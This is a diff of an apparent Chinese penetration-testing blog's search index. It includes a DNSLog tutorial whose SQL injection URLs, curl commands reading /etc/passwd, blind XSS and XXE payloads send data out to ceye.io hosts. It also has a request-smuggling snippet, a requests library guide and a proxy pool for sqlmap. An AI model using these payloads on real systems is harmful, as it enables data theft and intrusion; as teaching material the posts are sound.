@@ -129,6 +129,88 @@
       </tags>
   </entry>
   <entry>
+    <title>通过DNSLog获取无回显信息</title>
+    <url>/2020/07/04/DNSLog/</url>
+    <content><![CDATA[<h2 id="0x01-原理">0x01 原理</h2>
+<blockquote>
+<p>NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析<br>
+DNS：域名解析服务器<br>
+A记录：指定域名对应的IP地址</p>
+</blockquote>
+<p><strong>一句话归纳</strong>😪😪：<br>
+　　<font color=blue>将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。</font></p>
+<ul>
+<li>案例解释</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping &#96;whoami&#96;.test.com	&#x2F;&#x2F;发出请求</span><br><span class="line">ping root.test.com	&#x2F;&#x2F;实际请求</span><br></pre></td></tr></table></figure>
+<p><code>whoami</code>在命令行中就自动解析了，所以其实是向<code>root.test.com</code>发出的请求，这时就会被DNS服务器所捕获，我们就能从日志中获取命令执行后的结果了。那到底怎么利用DNSLog进行注入呢？其实只要是能够发出请求的地方都可以用这种方式获取数据。</p>
+<h2 id="0x02-DNSLog平台">0x02 DNSLog平台</h2>
+<p>一、在线平台：<code>http://ceye.io</code>、<code>http://www.dnslog.cn</code></p>
+<p>二、自己搭建DNSLog服务器：<code>https://github.com/BugScanTeam/DNSLog</code></p>
+<p>三、 BurpSuite collaborator</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105715.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105732.png" alt=""></p>
+<p>点击Copy to Clipboard获取一个标识<br>
+比如我这里获取到的就是<code>s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net</code><br>
+然后用这个外带就行了</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105806.png" alt=""></p>
+<h2 id="0x03-DNSLog常用场景">0x03 DNSLog常用场景</h2>
+<ol>
+<li>SQL盲注</li>
+<li>命令执行（无回显）</li>
+<li>XSS（无回显）</li>
+<li>SSRF(无回显)</li>
+</ol>
+<h3 id="SQL盲注">SQL盲注</h3>
+<p>以MySQL为例，在MySQL中有个一个<font color=blue>load_file</font>函数可以用来读取本地的文件。前提是root权限。<br>
+show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
+<ul>
+<li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
+<li>当secure_file_priv为E:\，就可以读取E盘的文件。</li>
+<li>当secure_file_priv为null，load_file就不能加载文件。</li>
+</ul>
+<p>⚠️ 注意：load_file函数在<font color=red>Linux</font>下是无法用来做dnslog攻击的，因为在这里就涉及到Windows——<font color=blue>UNC</font>路径。</p>
+<blockquote>
+<p>UNC路径：UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
+</blockquote>
+<p>平常在Widnows中用共享文件的时候就会用到这种网络地址的形式：<code>\\sss.xxx\test\</code><br>
+这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
+<p>⚠️ 如果查询的数据中出现了非字母数字的特殊字符，需要进行<font color=blue>转义</font>，这里用16进制。原因是如果出现如逗号，@符号等特殊符号，不能形成标准的dns域名，无法发出数据。</p>
+<ul>
+<li>几个例子</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接读取</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">hex转码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">取数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(concat(username,0x7e,password,0x7e)) from security.users limit 0,1),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br></pre></td></tr></table></figure>
+<h3 id="命令执行">命令执行</h3>
+<h4 id="Windows下">Windows下</h4>
+<p>查看计算机名，其他类似</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping %COMPUTERNAME%.xxx.ceye.io</span><br></pre></td></tr></table></figure>
+<h4 id="Linux下">Linux下</h4>
+<p>查看当前用户和passwd文件，其他类似</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;&#96;whoami&#96;</span><br><span class="line">curl http:&#x2F;&#x2F;ip.port.xxoo.ceye.io&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;</span><br></pre></td></tr></table></figure>
+<h3 id="XSS">XSS</h3>
+<p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="SSRF">SSRF</h3>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;aa&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-总结">0x04 总结</h2>
+<ul>
+<li>有些函数的使用具有操作系统的限制。</li>
+<li>DNS查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。</li>
+<li>避免一些特殊符号的产生，最好的选择就是数据先编码再带出。</li>
+<li>注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。</li>
+<li>有些操作是需要较高的权限。</li>
+</ul>
+<p>🌈🌈 利用DNSLog攻击的方法，能更加简便、高效的进行渗透测试，并且拥有足够权限，可以直接拿下目标站点。</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTTP请求走私</title>
     <url>/2020/07/29/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
     <content><![CDATA[<h1 id="产生原因">产生原因</h1>
@@ -274,88 +356,6 @@
 <p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724173247.png" alt=""></p>
 <p>原理是走私的请求把下一个请求HTTP方法那一行注释，请求会变为：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1</span><br><span class="line">Foo: XGET &#x2F;static&#x2F;some-image.png HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: sessionId&#x3D;q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>通过DNSLog获取无回显信息</title>
-    <url>/2020/07/04/DNSLog/</url>
-    <content><![CDATA[<h2 id="0x01-原理">0x01 原理</h2>
-<blockquote>
-<p>NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析<br>
-DNS：域名解析服务器<br>
-A记录：指定域名对应的IP地址</p>
-</blockquote>
-<p><strong>一句话归纳</strong>😪😪：<br>
-　　<font color=blue>将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。</font></p>
-<ul>
-<li>案例解释</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping &#96;whoami&#96;.test.com	&#x2F;&#x2F;发出请求</span><br><span class="line">ping root.test.com	&#x2F;&#x2F;实际请求</span><br></pre></td></tr></table></figure>
-<p><code>whoami</code>在命令行中就自动解析了，所以其实是向<code>root.test.com</code>发出的请求，这时就会被DNS服务器所捕获，我们就能从日志中获取命令执行后的结果了。那到底怎么利用DNSLog进行注入呢？其实只要是能够发出请求的地方都可以用这种方式获取数据。</p>
-<h2 id="0x02-DNSLog平台">0x02 DNSLog平台</h2>
-<p>一、在线平台：<code>http://ceye.io</code>、<code>http://www.dnslog.cn</code></p>
-<p>二、自己搭建DNSLog服务器：<code>https://github.com/BugScanTeam/DNSLog</code></p>
-<p>三、 BurpSuite collaborator</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105715.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105732.png" alt=""></p>
-<p>点击Copy to Clipboard获取一个标识<br>
-比如我这里获取到的就是<code>s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net</code><br>
-然后用这个外带就行了</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105806.png" alt=""></p>
-<h2 id="0x03-DNSLog常用场景">0x03 DNSLog常用场景</h2>
-<ol>
-<li>SQL盲注</li>
-<li>命令执行（无回显）</li>
-<li>XSS（无回显）</li>
-<li>SSRF(无回显)</li>
-</ol>
-<h3 id="SQL盲注">SQL盲注</h3>
-<p>以MySQL为例，在MySQL中有个一个<font color=blue>load_file</font>函数可以用来读取本地的文件。前提是root权限。<br>
-show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
-<ul>
-<li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
-<li>当secure_file_priv为E:\，就可以读取E盘的文件。</li>
-<li>当secure_file_priv为null，load_file就不能加载文件。</li>
-</ul>
-<p>⚠️ 注意：load_file函数在<font color=red>Linux</font>下是无法用来做dnslog攻击的，因为在这里就涉及到Windows——<font color=blue>UNC</font>路径。</p>
-<blockquote>
-<p>UNC路径：UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
-</blockquote>
-<p>平常在Widnows中用共享文件的时候就会用到这种网络地址的形式：<code>\\sss.xxx\test\</code><br>
-这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
-<p>⚠️ 如果查询的数据中出现了非字母数字的特殊字符，需要进行<font color=blue>转义</font>，这里用16进制。原因是如果出现如逗号，@符号等特殊符号，不能形成标准的dns域名，无法发出数据。</p>
-<ul>
-<li>几个例子</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接读取</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">hex转码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">取数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(concat(username,0x7e,password,0x7e)) from security.users limit 0,1),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br></pre></td></tr></table></figure>
-<h3 id="命令执行">命令执行</h3>
-<h4 id="Windows下">Windows下</h4>
-<p>查看计算机名，其他类似</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping %COMPUTERNAME%.xxx.ceye.io</span><br></pre></td></tr></table></figure>
-<h4 id="Linux下">Linux下</h4>
-<p>查看当前用户和passwd文件，其他类似</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;&#96;whoami&#96;</span><br><span class="line">curl http:&#x2F;&#x2F;ip.port.xxoo.ceye.io&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;</span><br></pre></td></tr></table></figure>
-<h3 id="XSS">XSS</h3>
-<p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="SSRF">SSRF</h3>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;aa&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-总结">0x04 总结</h2>
-<ul>
-<li>有些函数的使用具有操作系统的限制。</li>
-<li>DNS查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。</li>
-<li>避免一些特殊符号的产生，最好的选择就是数据先编码再带出。</li>
-<li>注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。</li>
-<li>有些操作是需要较高的权限。</li>
-</ul>
-<p>🌈🌈 利用DNSLog攻击的方法，能更加简便、高效的进行渗透测试，并且拥有足够权限，可以直接拿下目标站点。</p>
-]]></content>
       <categories>
         <category>渗透</category>
       </categories>
@@ -817,6 +817,56 @@ show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
       </tags>
   </entry>
   <entry>
+    <title>request库使用</title>
+    <url>/2020/07/17/requests%E5%BA%93/</url>
+    <content><![CDATA[<h2 id="构造请求">构造请求</h2>
+<h3 id="请求头">请求头</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers=&#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/vnd.github.v3.text-match+json&#x27;</span>&#125;</span><br><span class="line">res = requests.get(url,headers)</span><br></pre></td></tr></table></figure>
+<h3 id="get请求">get请求</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = requests.get(url=<span class="string">&#x27;https://api.github.com/search/repositories&#x27;</span>)</span><br><span class="line">参数</span><br><span class="line"><span class="comment"># res = requests.get(url,params)</span></span><br><span class="line"><span class="comment"># params=&#123;&#x27;q&#x27;:&#x27;requests+language:python&#x27;&#125;</span></span><br><span class="line"><span class="comment"># params=[(&#x27;q&#x27;, &#x27;requests+language:python&#x27;)]</span></span><br><span class="line"><span class="comment"># params=b&#x27;q=requests+language:python&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="其他请求方法">其他请求方法</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.post(<span class="string">&#x27;https://httpbin.org/post&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.put(<span class="string">&#x27;https://httpbin.org/put&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.delete(<span class="string">&#x27;https://httpbin.org/delete&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.head(<span class="string">&#x27;https://httpbin.org/get&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.patch(<span class="string">&#x27;https://httpbin.org/patch&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.options(<span class="string">&#x27;https://httpbin.org/get&#x27;</span>)</span><br><span class="line">消息体</span><br><span class="line"><span class="comment">#  data=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;</span></span><br><span class="line"><span class="comment">#  data=[(&#x27;key&#x27;, &#x27;value&#x27;)&#125;</span></span><br><span class="line"><span class="comment">#  json=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="响应处理">响应处理</h2>
+<h3 id="响应状态码">响应状态码</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">status = res.status_code</span><br></pre></td></tr></table></figure>
+<h3 id="响应头信息（键不分大小写）">响应头信息（键不分大小写）</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">requests_header=res.headers[<span class="string">&#x27;content-type&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<h3 id="响应内容">响应内容</h3>
+<h4 id="字节格式查看内容">字节格式查看内容</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = res.content</span><br><span class="line"><span class="comment"># b&#x27;&#123;\n  &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;,\n  &quot;cur</span></span><br></pre></td></tr></table></figure>
+<h4 id="字符串格式查看内容（序列化JSON）">字符串格式查看内容（序列化JSON）</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">因为对 <span class="built_in">bytes</span> 解码到 <span class="built_in">str</span> 需要一个编码格式，所以如果你没有指定，请求将尝试根据响应头来猜测编码格式</span><br><span class="line">res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line">data=res.text</span><br><span class="line"><span class="comment"># &#123;&quot;current_user_url&quot;:&quot;https://api.github.com/user&quot;,&quot;cur</span></span><br></pre></td></tr></table></figure>
+<h4 id="字典形式内容（反序列化JSON）">字典形式内容（反序列化JSON）</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=res.json()</span><br><span class="line"><span class="comment"># &#123;&#x27;current_user_url&#x27;: &#x27;https://api.github.com/user&#x27;, &#x27;curin</span></span><br><span class="line">提取内容</span><br><span class="line">repository = data[<span class="string">&#x27;items&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">也可以使用 .text 获取 <span class="built_in">str</span> 并使用json.loads() 对其进行反序列化</span><br><span class="line">json.loads(data)</span><br></pre></td></tr></table></figure>
+<h2 id="其他">其他</h2>
+<h3 id="检查请求">检查请求</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">requests 库会在将请求实际发送到目标服务器之前准备该请求。 请求准备包括像验证头信息和序列化JSON内容等</span><br><span class="line">response.request.headers[<span class="string">&#x27;Content-Type&#x27;</span>]</span><br><span class="line">response.request.url</span><br><span class="line">response.request.body</span><br></pre></td></tr></table></figure>
+<h3 id="身份验证">身份验证</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">使用auth 参数，rqeuests 将使用HTTP的基本访问认证方案来应用凭据</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>, auth=(<span class="string">&#x27;username&#x27;</span>, getpass()))</span><br><span class="line">成功返回&lt;Response [<span class="number">200</span>]&gt;，失败返回&lt;Response [<span class="number">401</span>]&gt;</span><br><span class="line"></span><br><span class="line">HTTPBasicAuth效果同上</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>, auth=HTTPBasicAuth(<span class="string">&#x27;username&#x27;</span>, getpass()))</span><br><span class="line"></span><br><span class="line">requests 也提供了其他身份验证方法，例如 HTTPDigestAuth 和 HTTPProxyAuth</span><br></pre></td></tr></table></figure>
+<h3 id="关闭SSL证书验证">关闭SSL证书验证</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="性能">性能</h2>
+<h3 id="超时">超时</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">还可以将元组传递给 timeout，第一个元素是连接超时（它允许客户端与服务器建立连接的时间），第二个元素是读取超时（一旦你的客户已建立连接而等待响应的时间）</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=(<span class="number">2</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">超时异常</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> Timeout</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> Timeout:</span><br><span class="line">    print(<span class="string">&#x27;The request timed out&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;The request did not time out&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="Session对象">Session对象</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Session 用于跨请求保留参数。 例如，如果要跨多个请求使用相同的身份验证,当你的应用程序想要再次连接到同一服务器时，它将重用池中的连接而不是建立新连接。</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">    session.auth = (<span class="string">&#x27;username&#x27;</span>, getpass())</span><br><span class="line">    response = session.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="最大重试">最大重试</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">通过 Transport Adapters，你可以为每个与之交互的服务定义一组配置。 例如，假设你希望所有对于https://api.github.com的请求在最终抛出 ConnectionError 之前重试三次。 你将构建一个 Transport Adapter，设置其 max_retries 参数，并将其装载到现有的 Session</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError</span><br><span class="line"></span><br><span class="line">github_adapter = HTTPAdapter(max_retries=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use `github_adapter` for all requests to endpoints that start with this URL</span></span><br><span class="line">session.mount(<span class="string">&#x27;https://api.github.com&#x27;</span>, github_adapter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session.get(<span class="string">&#x27;https://api.github.com&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> ConnectionError <span class="keyword">as</span> ce:</span><br><span class="line">    print(ce)</span><br></pre></td></tr></table></figure>
+<h2 id="结尾">结尾</h2>
+<blockquote>
+<blockquote>
+<p>re库参考：<a href="https://juejin.im/post/5d8c630e51882511f444f65b">https://juejin.im/post/5d8c630e51882511f444f65b</a></p>
+</blockquote>
+</blockquote>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SqlMap总结</title>
     <url>/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="SqlMap测试基本流程">SqlMap测试基本流程</h2>
@@ -883,6 +933,138 @@ linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =<br>
       </categories>
       <tags>
         <tag>Sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SqlMap代理池</title>
+    <url>/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
+    <content><![CDATA[<h2 id="获取代理池">获取代理池</h2>
+<p>获取代理池使用了GIthub上的项目：<a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a> ，并利用REDIS存储获取到的代理地址</p>
+<h3 id="启动项目">启动项目</h3>
+<p>在<code>cli</code>目录下通过<code>ProxyPool.py</code>启动</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 首先启动调度程序</span><br><span class="line">&gt;&gt;&gt;python proxyPool.py schedule</span><br><span class="line"></span><br><span class="line"># 然后启动webApi服务</span><br><span class="line">&gt;&gt;&gt;python proxyPool.py webserver</span><br></pre></td></tr></table></figure>
+<h3 id="Api">Api</h3>
+<p>启动过几分钟后就能看到抓取到的代理IP，可以直接到数据库中查看，也可以通过api访问http://127.0.0.1:5010 查看。</p>
+<table>
+<thead>
+<tr>
+<th>api</th>
+<th>method</th>
+<th>Description</th>
+<th>arg</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/</td>
+<td>GET</td>
+<td>api介绍</td>
+<td>None</td>
+</tr>
+<tr>
+<td>/get</td>
+<td>GET</td>
+<td>随机获取一个代理</td>
+<td>None</td>
+</tr>
+<tr>
+<td>/get_all</td>
+<td>GET</td>
+<td>获取所有代理</td>
+<td>None</td>
+</tr>
+<tr>
+<td>/get_status</td>
+<td>GET</td>
+<td>查看代理数量</td>
+<td>None</td>
+</tr>
+<tr>
+<td>/delete</td>
+<td>GET</td>
+<td>删除代理</td>
+<td>proxy=host:ip</td>
+</tr>
+</tbody>
+</table>
+<h3 id="保存代理">保存代理</h3>
+<p>自己编写了个小脚本将<code>ProxyPool.py</code>获取到的代理保存在<code>ips.txt</code>中<br>
+<strong>get_proxy.py</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_proxy():</span><br><span class="line">    return requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_all&#x2F;&quot;).json()</span><br><span class="line"></span><br><span class="line">def delete_proxy(proxy):</span><br><span class="line">    requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;delete&#x2F;?proxy&#x3D;&#123;&#125;&quot;.format(proxy))</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_status&quot;).json()</span><br><span class="line">count &#x3D; res.get(&quot;useful_proxy&quot;)</span><br><span class="line">print(&quot;目前代理池中共计：%s个代理.&quot; % count)</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;ips.txt&quot;, &quot;w&quot;)</span><br><span class="line">for i in range(count):</span><br><span class="line">    b &#x3D; get_proxy()[i][&quot;proxy&quot;]</span><br><span class="line">f.write(b + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<h2 id="本地代理转发">本地代理转发</h2>
+<p>借用前人的成果，实现的效果是启用本地<code>127.0.0.1:9999</code>服务，将<code>ips.txt</code>内的代理转发给本地客户端<br>
+<strong><a href="http://ips.py">ips.py</a></strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> error</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">localtime = time.asctime(time.localtime(time.time()))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyServerTest</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, proxyip</span>):</span></span><br><span class="line">        <span class="comment"># 本地socket服务</span></span><br><span class="line">        self.ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.proxyip = proxyip</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 本地服务IP和端口</span></span><br><span class="line">            self.ser.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span 